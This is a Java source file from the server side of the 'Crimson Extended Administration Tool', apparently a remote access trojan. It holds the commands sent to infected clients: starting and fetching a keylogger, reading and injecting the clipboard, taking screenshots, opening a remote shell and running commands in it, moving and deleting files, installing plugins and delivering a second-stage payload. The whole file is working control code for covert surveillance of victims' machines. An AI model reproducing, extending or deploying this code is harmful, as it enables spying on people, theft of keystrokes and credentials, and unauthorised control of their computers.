package subterranean.crimson.server.commands;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import javax.swing.ImageIcon;

import subterranean.crimson.server.HostInfo;
import subterranean.crimson.server.ServerUtilities;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.FileListing;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.StreamStore;
import subterranean.crimson.universal.containers.KeyloggerLog;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.exceptions.InvalidResponseException;
import subterranean.crimson.universal.exceptions.NoReplyException;
import subterranean.crimson.universal.streams.filestream.FSParameters;
import subterranean.crimson.universal.streams.filestream.FileStream;
import subterranean.crimson.universal.streams.infostream.ISParameters;
import subterranean.crimson.universal.streams.infostream.InfoStream;

public enum ClientCommands {
	;

	public static void chat_clear(Connection c) {
		Message mreq = new Message(randId(), BMN.CHAT_clear);
		c.send(mreq);
	}

	public static boolean chat_isSessionOpen(Connection c) {
		// Message mreq = new Message(randId(), BMN.CHAT_isSessionOpen);
		// c.send(mreq);
		// Message mres = c.i.getId(mreq.getStreamID());
		// return (boolean) mres.auxObject[0];
		return false;
	}

	public static void chat_message(Connection c, String m, String sender) {
		Object[] o = { m, sender };
		Message mreq = new Message(randId(), BMN.CHAT_message);
		mreq.auxObject = o;
		c.send(mreq);
	}

	public static void client_assignID(int id, Connection c) {
		Message mreq = new Message(randId(), BMN.CLIENT_assignID, id);
		c.send(mreq);
	}

	public static void client_disconnect(Connection c) {
		Message mreq = new Message(randId(), BMN.DISCONNECTION);
		c.send(mreq);
	}

	public static String[] client_getLog(Connection c) throws InvalidResponseException {
		Logger.add("Retrieving Client log");

		Message mreq = new Message(randId(), BMN.CLIENT_getClientLog);
		c.send(mreq);
		ArrayList<String> log;
		Message mres = c.i.getId(mreq.getStreamID());
		if ((mres == null) || (mres.auxObject[0] == null) || !(mres.auxObject[0] instanceof ArrayList<?>)) {
			throw new InvalidResponseException();
		}
		log = (ArrayList<String>) mres.auxObject[0];

		String[] lines = new String[log.size()];
		for (int i = 0; i < log.size(); i++) {
			lines[i] = log.get(i);
		}

		return lines;
	}

	public static void client_relocate(Connection c, String newLocation) {
		Logger.add("Relocating Client");

		Message mreq = new Message(randId(), BMN.CLIENT_relocate, newLocation);
		c.send(mreq);

	}

	public static void client_restart(Connection c) {
		Logger.add("Restarting Client Process");

		Message mreq = new Message(randId(), BMN.CLIENT_restart);
		c.send(mreq);
	}

	public static void client_shutdown(Connection c) {
		Logger.add("Shutting down Client Process");

		Message mreq = new Message(randId(), BMN.CLIENT_shutdown);
		c.send(mreq);
	}

	public static void client_uninstall(Connection c) {
		Logger.add("Uninstalling Client");

		Message mreq = new Message(randId(), BMN.CLIENT_uninstall);
		c.send(mreq);
	}

	public static void client_update(Connection c, byte[] jar) {
		Logger.add("Updating Client Remotely");

		Message mreq = new Message(randId(), BMN.CLIENT_update, jar);
		c.send(mreq);

	}

	public static void client_update(Connection c, String jar) {
		Logger.add("Updating Client from File");

		try {
			client_update(c, Files.readAllBytes(Paths.get(jar)));

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public static void clipboard_inject(Connection c, String text) {
		Logger.add("Injecting: \"" + text + "\" into client's clipboard");
		Message mreq = new Message(randId(), BMN.CLIPBOARD_inject, text);
		c.send(mreq);

	}

	public static String clipboard_retrieve(Connection c) {

		Message mreq = new Message(randId(), BMN.CLIPBOARD_retrieve);
		c.send(mreq);
		Message mres = c.i.getId(mreq.getStreamID());
		Logger.add("Got: \"" + (String) mres.auxObject[0] + "\"");
		return (String) mres.auxObject[0];
	}

	public static HashMap<String, Object> getFileInfo(Connection c, String path) {
		Message mreq = new Message(randId(), BMN.FILEMANAGER_getFileInfo, path);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());

		HashMap<String, Object> info = (HashMap<String, Object>) output.auxObject[0];
		return info;

	}

	public static HostInfo getInfo(Connection c) throws NoReplyException {
		Logger.add("Getting host information");

		Message mreq = new Message(randId(), BMN.CLIENT_getBasicInfo);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		if (output == null) {
			throw new NoReplyException();
		}
		@SuppressWarnings("unchecked")
		HashMap<String, Object> info = (HashMap<String, Object>) output.auxObject[0];

		info.put("remote_ip_address", c.rAddress);

		return new HostInfo(info);
	}

	public static KeyloggerLog getKeyloggerData(Connection c) {
		Message mreq = new Message(randId(), BMN.KEYLOGGER_getLog);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (KeyloggerLog) output.auxObject[0];
	}

	public static String[] getProcessList(Connection c) {
		Logger.add("Getting Process List");
		Message mreq = new Message(randId(), BMN.PROCESSMANAGER_list);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (String[]) output.auxObject[0];

	}

	public static boolean host_power_hibernate(Connection c) {
		Logger.add("Hibernating client");

		Message mreq = new Message(randId(), BMN.POWER_hibernate);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (boolean) output.auxObject[0];
	}

	public static boolean host_power_logoff(Connection c) {
		Logger.add("Logging client off");

		Message mreq = new Message(randId(), BMN.USER_logoff);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (boolean) output.auxObject[0];

	}

	public static boolean host_power_restart(Connection c) {
		Logger.add("Restarting host");

		Message mreq = new Message(randId(), BMN.POWER_restart);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (boolean) output.auxObject[0];
	}

	public static boolean host_power_shutdown(Connection c) {
		Logger.add("Shutting down host");

		Message mreq = new Message(randId(), BMN.POWER_shutdown);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (boolean) output.auxObject[0];
	}

	public static boolean host_power_standby(Connection c) {
		Logger.add("Client standing by");

		Message mreq = new Message(randId(), BMN.POWER_standby);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		return (boolean) output.auxObject[0];
	}

	public static void plugin_install(Connection c, byte[] plugin, String pac) {
		Object[] o = { plugin, pac };
		Message mreq = new Message(randId(), BMN.PLUGIN_install);
		mreq.auxObject = o;
		c.send(mreq);
	}

	public static ImageIcon screenmanager_screenshot(Connection c, int monitorID) throws InvalidResponseException {

		Message mreq = new Message(randId(), BMN.SCREENMANAGER_screenshot, monitorID);
		c.send(mreq);
		Message mres = c.i.getId(mreq.getStreamID());
		if (mres == null || mres.auxObject == null || !(mres.auxObject[0] instanceof ImageIcon)) {
			throw new InvalidResponseException();
		}
		ImageIcon image = (ImageIcon) mres.auxObject[0];

		return image;
	}

	public static int randId() {
		return new Random().nextInt(Integer.MAX_VALUE);
	}

	public static int shell_initialize(Connection c) throws InvalidResponseException {
		Message mreq = new Message(randId(), BMN.SHELL_initialize);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		if ((output == null) || (output.auxObject[0] == null)) {
			throw new InvalidResponseException();
		}

		return (Integer) output.auxObject[0];

	}

	public static void shell_kill(Connection c, int id) {
		Message mreq = new Message(randId(), BMN.SHELL_kill, id);
		c.send(mreq);

	}

	public static String[] shell_execute(Connection c, String command, int shellID) throws InvalidResponseException {
		Object[] o = { command, shellID };

		Message mreq = new Message(randId(), BMN.SHELL_execute);
		mreq.auxObject = o;
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		if (output.auxObject == null) {
			throw new InvalidResponseException();
		}
		return (String[]) output.auxObject[0];
	}

	public static HashMap<String, String> sigar_gather(Connection c) throws InvalidResponseException {
		Logger.add("Running a SIGAR collection");
		Message mreq = new Message(randId(), BMN.SIGAR_gather);
		c.send(mreq);
		Message output = c.i.getId(mreq.getStreamID());
		if (output == null || output.auxObject == null || !(output.auxObject[0] instanceof HashMap<?, ?>)) {
			throw new InvalidResponseException();
		}
		HashMap<String, Map> raw = (HashMap<String, Map>) output.auxObject[0];
		HashMap<String, String> newMap = new HashMap<String, String>();

		// condense the Maps
		for (String topKey : raw.keySet()) {
			newMap.putAll(raw.get(topKey));

		}

		return newMap;

	}

	public static void startKeylogger(Connection c) {
		Logger.add("Starting keylogger");
		Message mreq = new Message(randId(), BMN.KEYLOGGER_start);
		c.send(mreq);

	}

	public static void stopKeylogger(Connection c) {
		Logger.add("Stopping keylogger");
		Message mreq = new Message(randId(), BMN.KEYLOGGER_stop);
		c.send(mreq);

	}

	public static void beginTransfer(FSParameters param, Connection c) {
		FileStream fs = new FileStream(param, c);
		fs.start();

	}

	public static void startPreviewStream(Connection c, int id, long p, int w) {

		Message m = new Message(randId(), BMN.STREAMCONTROL_start);
		m.auxObject = new Object[] { id, p, w };
		c.send(m);

	}

	public static void startInfoStream(Connection c, int id, long p) {

		ISParameters isp = new ISParameters();
		isp.setSender(false);
		
		InfoStream is = new InfoStream(isp);
		is.start();
		

	}

	public static void startRemoteStream(Connection c, int id) {
		Message m = new Message(randId(), BMN.STREAMCONTROL_start, id);
		c.send(m);

	}

	public static void stopStream(Connection c, int id) {
		Message m = new Message(randId(), BMN.STREAMCONTROL_stop, id);
		c.send(m);
	}

	public static void client_refresh(Connection c) throws NoReplyException {

		c.getProfile().info = getInfo(c);

	}

	public static int getStage(Connection c) throws NoReplyException {
		Message m = new Message(randId(), BMN.CLIENT_stageQuery);
		c.send(m);
		Message result = c.i.getId(m.getStreamID());
		if (result == null || result.auxObject == null) {
			throw new NoReplyException();
		}
		return (int) result.auxObject[0];
	}

	public static void sendStage2(Connection c) {
		Message m = new Message(randId(), BMN.CLIENT_sendStage, ServerUtilities.loadStage2());
		c.send(m);
		c.i.getId(m.getStreamID());// wait for the ok

	}

	public static void filemanager_delete(Connection c, String filename) {
		c.send(new Message(ClientCommands.randId(), BMN.FILEMANAGER_delete, filename));
	}

	public static void down(Connection c, String filename) {
		c.send(new Message(ClientCommands.randId(), BMN.FILEMANAGER_down, filename));
	}

	public static FileListing[] filemanager_list(Connection c) throws InvalidResponseException {
		Message mreq = new Message(ClientCommands.randId(), BMN.FILEMANAGER_list);
		c.send(mreq);
		Message mres = c.i.getId(mreq.getStreamID());
		if (mres == null || mres.auxObject == null || mres.auxObject[0] == null || !(mres.auxObject[0] instanceof FileListing[])) {
			Logger.add("Invalid Response");
			throw new InvalidResponseException();
		}
		return (FileListing[]) mres.auxObject[0];
	}

	public static String filemanager_pwd(Connection c) throws InvalidResponseException {
		Message mreq = new Message(ClientCommands.randId(), BMN.FILEMANAGER_pwd);
		c.send(mreq);
		Message mres = c.i.getId(mreq.getStreamID());
		if (mres == null || mres.auxObject == null || mres.auxObject[0] == null || !(mres.auxObject[0] instanceof String)) {
			Logger.add("Invalid Response");
			throw new InvalidResponseException();
		}
		return (String) mres.auxObject[0];
	}

	public static void filemanager_up(Connection c) {
		c.send(new Message(ClientCommands.randId(), BMN.FILEMANAGER_up));
	}

}
